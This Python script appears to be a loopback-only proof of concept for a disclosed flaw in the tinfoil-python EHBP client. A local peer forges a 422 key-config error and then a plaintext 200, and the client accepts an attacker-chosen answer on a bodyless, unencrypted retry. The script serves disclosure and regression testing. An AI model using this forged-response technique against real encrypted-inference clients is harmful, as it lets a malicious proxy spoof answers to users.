"""Finding 11 PoC (loopback only): tinfoil-python 0.14.0 + tinfoil-ehbp 0.4.0.

A forged 422 key-config error makes the re-verifying transport resend a
one-shot-body POST as an unencrypted, bodyless request, and the peer's forged
plaintext 200 is returned as the answer.

Drives the public API: SecureClient(transport="ehbp", base_url=<peer>)
.make_secure_http_client() / .make_secure_async_http_client(), and TinfoilAI for
the OpenAI-SDK control. The ONLY stub is SecureClient.verify(), which returns
the GroundTruth a successful attestation yields (the genuine HPKE public key).
The peer never holds the HPKE private key.

Run: python -I poc_rekey_bodyless.py
"""
from __future__ import annotations

import asyncio
import io
import json
import os
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey

import tinfoil
from tinfoil.client import GroundTruth, SecureClient

CANARY = "CANARY-PROMPT one-shot body"
PAYLOAD = json.dumps({"model": "m", "messages": [{"role": "user", "content": CANARY}]}).encode()
KEYCONFIG_422 = json.dumps({"type": "urn:ietf:params:ehbp:error:key-config", "title": "stale key"}).encode()
FORGED_200 = json.dumps({"id": "forged", "object": "chat.completion", "created": 1, "model": "m", "choices": [
    {"index": 0, "message": {"role": "assistant", "content": "ATTACKER-CHOSEN ANSWER"}, "finish_reason": "stop"}]}).encode()

SEEN: list[dict] = []


class Peer(BaseHTTPRequestHandler):
    """The client's TLS peer (gateway / proxy). Forges a 422, then a 200."""

    def log_message(self, *a):
        pass

    def do_POST(self):
        body = b""
        if self.headers.get("Transfer-Encoding", "").lower() == "chunked":
            while True:
                size = int(self.rfile.readline().split(b";")[0].strip() or b"0", 16)
                if size == 0:
                    self.rfile.readline()
                    break
                body += self.rfile.read(size)
                self.rfile.readline()
        else:
            body = self.rfile.read(int(self.headers.get("Content-Length") or 0))
        SEEN.append({"n": len(SEEN) + 1, "ehbp_key": "Ehbp-Encapsulated-Key" in self.headers,
                     "content_length": self.headers.get("Content-Length"), "body_len": len(body),
                     "canary_visible": CANARY.encode() in body})
        status, ctype, out = (422, "application/problem+json", KEYCONFIG_422) if len(SEEN) == 1 \
            else (200, "application/json", FORGED_200)
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(out)))
        self.end_headers()
        self.wfile.write(out)


def main() -> None:
    srv = ThreadingHTTPServer(("127.0.0.1", 0), Peer)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    peer = f"http://127.0.0.1:{srv.server_address[1]}"

    pub_hex = X25519PrivateKey.generate().public_key().public_bytes(
        serialization.Encoding.Raw, serialization.PublicFormat.Raw).hex()
    verifies = [0]

    def stub_verify(self) -> GroundTruth:  # what a successful attestation returns
        verifies[0] += 1
        return GroundTruth(public_key="", digest="", measurement="", hpke_public_key=pub_hex)

    SecureClient.verify = stub_verify

    def secure() -> SecureClient:
        return SecureClient(enclave="enclave.example", measurement={"stub": True}, transport="ehbp",
                            base_url=peer + "/v1/", user_cache_secret="CANARY-user-cache-secret")

    tmp = tempfile.NamedTemporaryFile(delete=False)
    tmp.write(PAYLOAD)
    tmp.close()

    class AsyncChunks:  # an async iterable that is not an async generator
        def __init__(self, data: bytes):
            self._it = iter([data])

        def __aiter__(self):
            return self

        async def __anext__(self):
            try:
                return next(self._it)
            except StopIteration:
                raise StopAsyncIteration

    def sync_case(content):
        return lambda: secure().make_secure_http_client().post(
            peer + "/v1/chat/completions", headers={"Content-Type": "application/json"}, content=content())

    async def _async_post():
        async with secure().make_secure_async_http_client() as c:
            return await c.post(peer + "/v1/chat/completions", content=AsyncChunks(PAYLOAD))

    def openai_sdk():
        ai = tinfoil.TinfoilAI(enclave="enclave.example", measurement={"stub": True}, api_key="tk-canary",
                               base_url=peer + "/v1/", user_cache_secret="CANARY-user-cache-secret")
        ai.client = ai.client.with_options(max_retries=0)
        r = ai.client.chat.completions.create(model="m", messages=[{"role": "user", "content": CANARY}])
        return type("R", (), {"status_code": 200, "text": r.choices[0].message.content})

    cases = [
        ("control  content=bytes", "safe", sync_case(lambda: PAYLOAD)),
        ("control  OpenAI SDK chat via TinfoilAI", "safe", openai_sdk),
        ("attack   content=open(file,'rb')", "vuln", sync_case(lambda: open(tmp.name, "rb"))),
        ("attack   content=io.BytesIO(...)", "vuln", sync_case(lambda: io.BytesIO(PAYLOAD))),
        ("attack   content=iter([...])", "vuln", sync_case(lambda: iter([PAYLOAD[:20], PAYLOAD[20:]]))),
        ("attack   async, non-generator async iterable", "vuln", lambda: asyncio.run(_async_post())),
    ]
    fixed = os.environ.get("POC_EXPECT") == "fixed"
    ok = True
    for label, kind, fn in cases:
        SEEN.clear()
        verifies[0] = 0
        try:
            r = fn()
            outcome = f"status={r.status_code} body={r.text[:90]!r}"
            forged = "ATTACKER-CHOSEN" in r.text
        except Exception as e:  # noqa: BLE001
            outcome = f"raised {type(e).__name__}: {str(e)[:80]}"
            forged = False
        print(f"\n=== {label}")
        for s in SEEN:
            print("  peer saw request", s)
        print(f"  verify() calls: {verifies[0]}; client outcome: {outcome}")
        if forged:
            print("  VULNERABLE: retry went out unencrypted and bodyless; forged plaintext 200 accepted")
        else:
            print("  OK: forged 200 not accepted")
        expect_forged = kind == "vuln" and not fixed
        ok &= forged == expect_forged
        ok &= not any(s["canary_visible"] for s in SEEN)  # never a confidentiality leak
    print("\nRESULT:", "as expected" if ok else "UNEXPECTED", f"(POC_EXPECT={'fixed' if fixed else 'vulnerable'})")
    os.unlink(tmp.name)
    raise SystemExit(0 if ok else 1)


if __name__ == "__main__":
    main()
